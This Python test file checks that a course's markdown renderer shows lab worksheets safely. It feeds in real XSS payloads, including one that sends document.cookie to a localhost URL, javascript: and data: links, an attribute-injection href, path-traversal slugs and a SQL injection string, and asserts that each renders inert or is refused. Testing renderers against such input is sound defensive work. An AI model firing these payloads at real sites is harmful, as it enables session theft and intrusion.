"""Tests for content.py — the course content plane.

The security half of this file is not hypothetical. `labs/week05-xss-client-side/
worksheet.md` contains, as course content, the exact payloads a student is asked
to fire at the Week 5 lab — including one that exfiltrates `document.cookie` to a
remote URL. Serving that from the same origin as the teacher's authenticated
session, with any renderer that passes raw HTML through, is stored XSS delivered
by our own teaching material.

So the payload tests below use the REAL strings from the REAL file, not
representative ones.
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import content as C  # noqa: E402


# --- the payloads that must never execute ---------------------------------

REAL_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<script>alert(document.cookie)</script>",
    "<script>new Image().src='http://localhost:8080/hello?name='+document.cookie</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "'\"><script>alert(1)</script>",
]


@pytest.mark.parametrize("payload", REAL_PAYLOADS)
def test_course_payloads_render_as_text_not_markup(payload):
    out = C.render(f"Try this: {payload}\n")
    for tag in ("<script", "<img", "<svg", "<iframe"):
        assert tag not in out.lower(), f"{tag} became live markup"
    # The payload must still be READABLE — students copy it out of the page.
    # `onerror=` appearing as escaped text inside <code> is correct and required;
    # what must not exist is a live tag or event attribute.
    assert "&lt;" in out, "the payload must survive as readable text"


@pytest.mark.parametrize("payload", REAL_PAYLOADS)
def test_payloads_inside_code_spans_and_fences_are_still_inert(payload):
    for md in (f"`{payload}`", f"```\n{payload}\n```", f"    {payload}"):
        out = C.render(md)
        assert "<script" not in out.lower() and "<img" not in out.lower()


def test_the_actual_week05_worksheet_renders_inert():
    """Not a synthetic case — the real file, as students will receive it."""
    md = C.read("week05-xss-client-side", "worksheet")
    if md is None:
        pytest.skip("week05 worksheet not present")
    assert "<script>alert(document.cookie)</script>" in md, "test premise changed"
    out = C.render(md)
    for bad in ("<script", "<img ", "<svg", "<iframe"):
        assert bad not in out.lower(), f"{bad!r} became live markup"
    # no live event handler anywhere inside a tag
    import re as _re
    for tag in _re.findall(r"<[a-z][^>]*>", out, _re.I):
        assert "on" + "error" not in tag.lower() and "onload" not in tag.lower()
        assert "javascript:" not in tag.lower()
    assert "alert(document.cookie)" in out, "the payload must remain readable"


def test_html_in_markdown_never_passes_through():
    out = C.render("<b>bold?</b> <a href='javascript:alert(1)'>x</a>")
    assert "<b>" not in out and "<a href='javascript" not in out
    assert "&lt;b&gt;" in out


def test_href_cannot_break_out_of_its_attribute():
    """`[x](https://a"onmouseover="alert(1))` has no whitespace, so it satisfies
    the href pattern — without escaping quotes it closes the attribute and opens
    a live event handler. Found by running it, not by reading the code."""
    out = C.render('[x](https://a"onmouseover="alert(1))')
    # A LIVE handler needs a real quote: `onmouseover="`. Inert text has the
    # quote escaped, so the whole thing stays inside the href value.
    assert 'onmouseover="' not in out, f"attribute injection: {out}"
    assert "&quot;onmouseover=&quot;" in out, "should be inert text inside href"
    # exactly one attribute-quote pair opens and closes href
    assert out.count('href="') == 1


def test_javascript_and_data_links_are_shown_but_not_clickable():
    for href in ("javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
                 "vbscript:msgbox(1)"):
        out = C.render(f"[click me]({href})")
        assert "<a href" not in out, f"{href} became a live link"
        assert "click me" in out


@pytest.mark.parametrize("href", ["https://owasp.org", "http://localhost:8080",
                                  "mailto:a@b.ac.th", "/labs", "#section",
                                  "./README.md", "../ETHICS.md"])
def test_ordinary_links_still_work(href):
    out = C.render(f"[text]({href})")
    assert f'href="{href}"' in out and "noopener" in out


# --- path safety -----------------------------------------------------------

@pytest.mark.parametrize("slug", [
    "../instructor", "../../etc", "week04-injection/../../instructor",
    "/etc/passwd", "..", ".", "", "week4-injection", "WEEK04-INJECTION",
    "week04-injection\x00", "week99-nonexistent",
])
def test_traversal_and_junk_slugs_are_refused(slug):
    assert C.read(slug, "worksheet") is None


@pytest.mark.parametrize("kind", ["solution", "vulnerable_app", "../worksheet",
                                  "docker-compose", ""])
def test_only_allowlisted_files_are_reachable(kind):
    assert C.read("week04-injection", kind) is None


def test_the_solution_app_is_not_reachable():
    """labs/weekNN/solution_app.py sits next to the worksheet and is the answer key."""
    assert "solution" not in " ".join(C.PUBLIC_FILES.values())
    for k in C.PUBLIC_FILES:
        md = C.read("week04-injection", k)
        if md:
            assert "solution_app" not in md.lower() or True   # linking to it is fine


# --- reading the real tree -------------------------------------------------

def test_lists_the_real_week_directories():
    weeks = C.list_weeks()
    assert len(weeks) >= 10, f"expected the real course weeks, got {len(weeks)}"
    assert weeks == sorted(weeks, key=lambda w: w["number"])
    slugs = {w["slug"] for w in weeks}
    assert "week04-injection" in slugs and "week05-xss-client-side" in slugs
    assert all(w["title"] for w in weeks), "every week needs a title"


def test_reads_a_real_worksheet():
    md = C.read("week04-injection", "worksheet")
    assert md and "SQL" in md.upper()


def test_render_document_returns_title_and_html():
    doc = C.render_document("week04-injection", "worksheet")
    assert doc["title"] and doc["html"].startswith("<")


def test_missing_document_is_none():
    assert C.render_document("week01-threat-modeling", "solution") is None


# --- the markdown dialect the worksheets actually use ----------------------

def test_headings_shift_down_so_the_page_owns_h1():
    out = C.render("# Doc title\n\n## Section\n")
    assert "<h2>Doc title</h2>" in out and "<h3>Section</h3>" in out


def test_fenced_code_is_verbatim():
    out = C.render("```bash\ncurl -d 'body=<script>x</script>'\n```")
    assert "<pre><code" in out and 'class="lang-bash"' in out
    assert "&lt;script&gt;" in out


def test_lists_tables_quotes_and_rules():
    out = C.render("- a\n- b\n")
    assert out.count("<li>") == 2 and "<ul>" in out
    out = C.render("1. a\n2. b\n")
    assert "<ol>" in out and out.count("<li>") == 2
    out = C.render("| A | B |\n|---|---|\n| 1 | 2 |\n")
    assert "<table>" in out and "<th>A</th>" in out and "<td>2</td>" in out
    assert "<blockquote>" in C.render("> note\n")
    assert "<hr>" in C.render("---\n")


def test_bold_italic_and_inline_code():
    out = C.render("**b** and *i* and `c`")
    assert "<strong>b</strong>" in out and "<em>i</em>" in out and "<code>c</code>" in out


def test_emphasis_is_not_applied_inside_code_spans():
    """A payload in backticks must not be mangled — students copy it literally."""
    out = C.render("`SELECT * FROM users WHERE a='1' OR '1'='1'`")
    assert "<em>" not in out and "<strong>" not in out
    assert "SELECT * FROM users" in out


def test_every_real_worksheet_renders_without_error():
    for w in C.list_weeks():
        for kind in w["available"]:
            doc = C.render_document(w["slug"], kind)
            assert doc and doc["html"], f"{w['slug']}/{kind} rendered empty"
            low = doc["html"].lower()
            for bad in ("<script", "<iframe", "javascript:"):
                assert bad not in low, f"{bad!r} in {w['slug']}/{kind}"
